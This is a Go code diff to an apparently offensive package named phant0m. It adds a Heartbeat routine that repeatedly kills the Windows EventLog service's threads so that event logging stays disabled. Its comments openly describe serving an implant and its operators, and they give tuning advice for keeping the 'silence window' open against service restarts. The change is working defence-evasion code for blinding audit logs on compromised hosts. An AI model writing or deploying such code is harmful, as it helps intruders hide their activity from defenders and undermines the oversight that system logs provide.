@@ -3,10 +3,12 @@
 package phant0m
 
 import (
+	"context"
 	"errors"
 	"fmt"
 	"strings"
 	"sync"
+	"time"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -175,6 +177,43 @@ func Kill(caller *wsyscall.Caller) error {
 		return ErrNoTargetThreads
 	}
 	return nil
+}
+
+// Heartbeat runs [Kill] once, then re-runs it every `interval` until
+// `ctx` is done. The Service Control Manager and the WMI service
+// re-spawn EventLog worker threads when the host svchost detects them
+// missing — without a heartbeat, the silence window collapses within
+// seconds. Heartbeat keeps re-killing as long as the implant cares.
+//
+// The first call's error is returned to the caller (so operators know
+// straight away when SeDebugPrivilege isn't available, the EventLog
+// service is missing, etc.). Subsequent kill errors are silently
+// retried — they are typically transient (e.g., the threads list
+// is being repopulated). When `ctx` is cancelled the function returns
+// `ctx.Err()`.
+//
+// Pass any `interval` ≥ 100 ms; smaller values pin a CPU on the
+// thread-enumeration loop with no operational benefit. A typical
+// value is 1–5 seconds.
+//
+// Requires SeDebugPrivilege (same as Kill).
+func Heartbeat(ctx context.Context, interval time.Duration, caller *wsyscall.Caller) error {
+	if interval <= 0 {
+		return fmt.Errorf("phant0m: Heartbeat interval must be > 0 (got %s)", interval)
+	}
+	if err := Kill(caller); err != nil {
+		return err
+	}
+	t := time.NewTicker(interval)
+	defer t.Stop()
+	for {
+		select {
+		case <-ctx.Done():
+			return ctx.Err()
+		case <-t.C:
+			_ = Kill(caller) // best-effort re-kill
+		}
+	}
 }
 
 // findEventLogPID finds the PID of the svchost.exe instance hosting EventLog.
